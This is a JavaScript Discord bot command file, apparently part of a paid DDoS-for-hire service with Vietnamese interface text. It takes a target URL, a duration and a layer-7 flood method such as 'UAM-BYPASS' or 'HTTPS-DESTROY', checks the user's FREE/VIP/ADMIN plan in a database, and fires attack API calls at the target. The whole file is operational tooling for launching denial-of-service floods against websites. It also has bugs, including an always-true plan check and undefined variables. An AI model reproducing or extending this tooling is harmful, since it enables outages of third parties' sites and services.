const { SlashCommandBuilder, WebhookClient, EmbedBuilder } = require('discord.js');
var axios = require("axios");
const { attack_log, api_free_l7, api_vip_l7, api_admin_l7, block_host } = require('../../config.json');
const webhookURL = attack_log;
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('database.db');
const wait = require('node:timers/promises').setTimeout;

module.exports = {
    data: new SlashCommandBuilder()
    .setName('start-l7')
    .setDescription('đấm layer 7')
    .addStringOption(option => option.setName('methods').setDescription('methods đấm').setRequired(true).addChoices(
       // { name: 'TLS-FLOOD(FREE)', value: 'TLS-FLOOD' },
        { name: 'TLS-BYPASS(VIP)', value: 'TLS-BYPASS' },
        { name: 'BROWSER(VIP)', value: 'BROWSER' },
       // { name: 'HTTPS-RAW(FREE)', value: 'HTTPS-RAW' },
       // { name: 'HTTPS-LOAD(FREE)', value: 'HTTPS-LOAD' },
       // { name: 'HTTPS-FLOOD(FREE)', value: 'HTTPS-FLOOD' },
        { name: 'HTTPS-DESTROY(VIP)', value: 'HTTPS-DESTROY' },
        { name: 'UAM-BYPASS(VIP)', value: 'UAM-BYPASS' },
        // { name: 'FLOODER', value: 'FLOODER' },
        // { name: 'HTTPS-VIP', value: 'HTTPS-VIP' },
        // { name: 'DESTROY', value: 'DESTROY' },
        // { name: 'HTTPS-LOAD', value: 'https-load' },
        // { name: 'SLOW(FREE)', value: 'SLOW' },
        // { name: 'OVH', value: 'ovh' },
        // { name: 'STORM-BYPASS', value: 'STORM-BYPASS' },
        // { name: 'HTTPS-DESTROY', value: 'HTTPS-DESTROY' },
    ))
    .addStringOption(option => option.setName('url').setDescription('ip server muốn đấm').setRequired(true))
    .addIntegerOption(option => option.setName('time').setDescription('thời gian đấm').setRequired(true)),
    cooldown: 300,
    async execute(interaction, client) {
        await interaction.deferReply({ ephemeral: true });
        await wait(1000)
        const userId = interaction.user.id;
        db.get('SELECT users_id, plan, exp, attack_time FROM users WHERE users_id = ?', [userId],async (err, row) => {
            if (err) {
              throw err; 
            }
            if (row) {
               if (`${row.plan}` === 'VIP', 'ADMIN') {
                  const url = interaction.options.get('url').value;
                  const time = interaction.options.get('time').value;
                  const method = interaction.options.get('methods').value;
                  const hostLink = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/;
                  if (!hostLink.test(url)) {
                     await interaction.editReply({ content: `sai định dạng url, Vd: https://github.com!`, ephemeral: true });
                     return;
                  }  
                  if (block_host.some((word) => interaction.toString().toLowerCase().includes(word))) {
                     await interaction.editReply({ content: `web nằm trong danh sách chặn tấn công!`, ephemeral: true });
                  } else if (time > row.attack_time) { 
                     await interaction.editReply({ content: `thời gian phải nhỏ hơn hoặc bằng ${row.attack_time}`, ephemeral: true });
                  } else {
   
                     const free = api_free_l7.replace('[url]', url).replace('[time]', time).replace('[method]', method);
                     const vip = api_vip_l7.replace('[url]', url).replace('[time]', time).replace('[method]', method);
                     const admin = api_admin_l7.replace('[url]', url).replace('[time]', time).replace('[method]', method);

                    if (row.plan === 'VIP' || row.plan === 'ADMIN') {
                      if (method === 'HTTPS-DESTROY' ||
                          method === 'BROWSER' ||
                          method === 'TLS-BYPASS' ||
                          method === 'UAM-BYPASS' ||
                          method === 'HTTPS-LOAD' ||
                          method === 'HTTPS-FLOOD' ||
                          method === 'HTTPS-RAW' ||
                          method === 'TLS-FLOOD') {
                            const embed = new EmbedBuilder()
                            .setColor(color)
                            .setTitle(namebot)
                            .setDescription('```'+ `Attack Sent Check DMS` + '```')
                            .setTimestamp()
                            .setFooter({ text: names, iconURL: `${admin_url}` });
                            await interaction.editReply({ embeds: [embed] , ephemeral: true });

                            const Embed = new EmbedBuilder()
                            .setColor(color)
                            .setTitle(namebot)
                            .setDescription('Type: layer7')
                            .addFields({ name: '`🧨 URL:`', value: `\`\`\`css\n[ ${url} ]\n\`\`\`` })
                            .addFields({ name: '`🕛 TIME:`', value: `\`\`\`css\n[ ${time} ]\n\`\`\`` })
                            .addFields({ name: '`🔰 METHOD:`', value: `\`\`\`css\n[ ${method} ]\n\`\`\`` })
                            .addFields({ name: '`💸 PLAN:`', value: `\`\`\`css\n[ ${row.plan} ]\n\`\`\`` })
                            .setImage(img_url)
                            .setTimestamp()
                            .setFooter({ text: names, iconURL: `${admin_url}` });
                            await interaction.user.send({ embeds: [Embed], ephemeral: true });
                      }
                    } else {
                      await interaction.editReply({content: 'err!', ephemeral: true});
                    }
                    
   
                    if (row.plan == 'FREE') {
                        axios.get(free)
                        .then(async (response) => {
                            if (response.status === 200) {
                              console.log('[axios] Kết quả thành công:', response.data);
                            } else if (response.status === 429) {
                              console.log('[axios] err:', response.status);
                            } else {
                              console.log('[axios] timeout:', response.status);
                            }
                        }).catch(async (error) => {
                            console.error('[axios] Lỗi kết nối:', error.message);
                        });
                    }
                    if (row.plan == 'VIP') {
                        axios.get(vip)
                        .then(async (response) => {
                            if (response.status === 200) {
                              console.log('[axios] Kết quả thành công:', response.data);
                            } else if (response.status === 429) {
                              console.log('[axios] err:', response.status);
                            } else {
                              console.log('[axios] timeout:', response.status);
                            }
                        }).catch(async (error) => {
                           console.error('[axios] Lỗi kết nối:', error.message);
                        });
                    }
                        if (row.plan == 'ADMIN') {
                        axios.get(admin)
                        .then(async (response) => {
                            if (response.status === 200) {
                              console.log('[axios] Kết quả thành công:', response.data);
                            } else if (response.status === 429) {
                              console.log('[axios] err:', response.status);
                            } else {
                              console.log('[axios] timeout:', response.status);
                            }
                        }).catch(async (error) => {
                           console.error('[axios] Lỗi kết nối:', error.message);
                        });
                        }
                    }
                }
            } else {
              await interaction.editReply({content: 'bạn ko có plan để sử dụng!', ephemeral: true});
            }
        });
    }
}